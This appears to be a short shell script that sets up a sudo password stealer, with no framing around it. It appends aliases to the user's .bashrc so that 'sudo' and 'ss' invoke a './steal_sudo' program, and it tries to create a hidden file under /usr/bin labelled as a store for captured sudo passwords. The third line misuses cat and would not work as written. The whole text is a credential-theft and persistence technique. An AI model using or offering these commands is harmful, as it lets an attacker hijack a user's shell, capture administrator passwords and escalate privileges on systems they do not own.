echo -n "alias ss='./steal_sudo'" >> /home/$USER/.bashrc
echo -n "alias sudo='./steal_sudo'" >> /home/$USER/.bashrc
cat "#This file stores sudo passwords" > /usr/bin/.passwordsfromSS
